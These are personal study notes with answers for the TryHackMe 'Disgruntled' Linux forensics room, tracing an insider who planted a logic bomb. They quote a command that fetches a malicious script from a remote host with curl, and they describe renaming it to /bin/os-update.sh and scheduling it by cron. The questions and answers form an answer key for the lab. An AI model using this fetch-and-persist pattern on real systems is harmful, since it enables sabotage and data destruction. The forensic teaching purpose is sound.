#Subscribers 
https://tryhackme.com/room/disgruntled

Hey, kid! Good, you’re here!

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.

Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.

My advice: Look at the privileged commands that were run. That should get you started.

```
cat /var/log/auth.log | grep install
cat /var/log/auth.log | grep admin
```

```
The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND? (Check the sudo execution history.)

/usr/bin/apt install dokuwiki

What was the present working directory (PWD) when the previous command was run?

/home/cybert
```

Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.

```
Which user was created after the package from the previous task was installed?  (Look for the "adduser" command in the logs.)

it-admin

A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS) (The "visudo" is called when editing the /etc/sudoers file. Look for this command in the logs.)

Dec 28 06:27:34

A script file was opened using the "vi" text editor. What is the name of this file?

bomb.sh

```

That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.

```
The command was run by a different user account. Look at the ".bash_history" found in the user's home directory.
What is the command used that created the file bomb.sh?

curl 10.10.158.38:8080/bomb.sh --output bomb.sh

The vi text editor can edit and save files to a different location. Check out the history of vi by looking for ".viminfo".
The file was renamed and moved to a different directory. What is the full path of this file now?

/bin/os-update.sh

Go to the file location and use the "ls -al --full-time" command.
When was the file from the previous question last modified? (Format: Month Day HH:MM)

Dec 28 06:29

Open the malicious file and figure out the answer from the code.
What is the name of the file that will get created when the file from the first question executes?

goodbye.txt

```

So we have a file and a motive. The question we now have is: how will this file be executed?
Surely, he wants it to execute at some point?

```
Check out the crontab and convert the schedule expression using a site like https://crontab.guru/.

At what time will the malicious file trigger? (Format: HH:MM AM/PM)

08:00 AM
```

Thanks to you, we now have a good idea of what our disgruntled IT person was planning.

We know that he had downloaded a previously prepared script into the machine, which will delete all the files of the installed service if the user has not logged in to this machine in the last 30 days. It’s a textbook example of a  “logic bomb”, that’s for sure.

Look at you, second day on the job, and you’ve already solved 2 cases for me. Tell Sophie I told you to give you a raise.

https://motasem-notes.net/cyber-incident-investigation-with-linux-forensics-tryhackme-disgruntled/

https://www.youtube.com/watch?v=UGiP02jWB10

![[Pasted image 20250317172007.png]]

300 points 

![[Pasted image 20250317172033.png]]

